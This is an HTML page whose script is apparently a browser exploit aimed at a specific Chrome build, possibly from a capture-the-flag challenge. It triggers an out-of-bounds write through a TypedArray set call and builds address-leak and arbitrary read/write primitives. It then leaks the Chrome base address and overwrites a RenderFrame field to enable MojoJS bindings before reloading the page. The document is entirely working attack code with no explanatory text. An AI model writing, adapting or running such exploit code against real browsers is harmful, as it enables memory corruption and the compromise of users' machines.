<html>
<script type="text/javascript">
    var g_buffer = new ArrayBuffer(16);
    var g_float64 = new Float64Array(g_buffer);
    var g_uint64 = new BigUint64Array(g_buffer);


    function float2address(f) {
        g_float64[0] = f;
        return g_uint64[0];
    }


    function address2float(addr) {
        let i = BigInt(addr);
        g_uint64[0] = i;
        return g_float64[0];
    }


    function hex(i) {
        return '0x' + i.toString(16).padStart('0');
    }

    function info(msg) {
        console.log('[+] ' + msg);
    }

    // =================================================================
    // Start Pwn
    // =================================================================


    var typedArray1 = new Int32Array(8);
    var oob_array = [1.1, 2.2, 3.3, 4.4];

    typedArray1[0] = 1;
    typedArray1[1] = 2;
    typedArray1[2] = 3;
    typedArray1[3] = 4;

    var typedArray2 = new Int32Array(4);
    typedArray2[0] = 0x100;
    typedArray2[2] = 0x40;

    /* Change the offset to trgger vuln */
    typedArray1.set(typedArray2, 14);

    for (var i = 0; i < 0x40; ++i) {
        if (typedArray1[i] == 0x8) {
            typedArray1[i] = 0x1000;
        }
    }


    var test = {};
    var victim_obj = { obj: test };
    var victim_array = [1.1];
    var control_buffer = new ArrayBuffer(0x1000);

    /* May should change this offset */
    var addr_of_index = 41;
    var victim_array_index = 49;
    var victim_array_length_index = 49;
    var control_buffer_backing_index = 53;

    function relative_addr_of(obj) {
        victim_obj.obj = obj;
        var address = float2address(oob_array[addr_of_index]) / 0x100000000n;
        return Number(address) - 1;
    }

    function change_victim_array_length(length) {
        length = 2 * length;
        var old_value = float2address(oob_array[victim_array_length_index]);
        old_value = old_value % 0x100000000n;
        var new_value = old_value + BigInt(length) * 0x100000000n;
        oob_array[victim_array_length_index] = address2float(new_value);
    }

    function read_relative_address(address, offset = 0) {
        var old_value = float2address(oob_array[victim_array_index]);
        old_value = old_value / 0x100000000n;
        var new_value = BigInt(address - 0x8 + 1) + old_value * 0x100000000n;
        oob_array[victim_array_index] = address2float(new_value);
        return float2address(victim_array[offset]);
    }

    function change_control_buffer(address) {
        var old_value = float2address(oob_array[control_buffer_backing_index]);
        old_value = old_value % 0x100000000n;
        var new_value = BigInt(address % 0x100000000n) * 0x100000000n + old_value;
        oob_array[control_buffer_backing_index] = address2float(new_value);

        old_value = float2address(oob_array[control_buffer_backing_index + 1]);
        old_value = old_value / 0x100000000n;
        var new_value = BigInt(address / 0x100000000n) + old_value * 0x100000000n;
        oob_array[control_buffer_backing_index + 1] = address2float(new_value);
    }

    change_victim_array_length(0x100);

    var window_addr = relative_addr_of(window);
    console.log(hex(window_addr));

    var chrome_base = read_relative_address(window_addr + 0x10) - 0xc1ce730n;
    console.log(hex(chrome_base));

    var g_frame_map = chrome_base + 0xc5637e0n;
    console.log(hex(g_frame_map));

    function read_abs_address_64(address) {
        change_control_buffer(address);
        var data_view = new BigUint64Array(control_buffer);
        return data_view[0x0];
    }

    function read_abs_address_32(address) {
        change_control_buffer(address);
        var data_view = new Uint32Array(control_buffer);
        return data_view[0x0];
    }

    console.log(hex(read_relative_address(relative_addr_of(typedArray1) + 0x28)));

    var begin_ptr = read_abs_address_64(g_frame_map + 0x8n);
    console.log(hex(begin_ptr));

    var node_ptr = read_abs_address_64(begin_ptr + 0x28n);
    var render_frame_ptr = node_ptr;
    console.log(hex(render_frame_ptr));

    console.log(typeof(Mojo));


    var enable_bindings_address = render_frame_ptr + 0x444n;
    change_control_buffer(enable_bindings_address);
    var data_view = new Uint8Array(control_buffer);
    console.log(hex(data_view[0x0]));
    if (data_view[0x0] == 0x0) {
        data_view[0x0] = 0x2;
        window.location.reload();
    }

</script>

</html>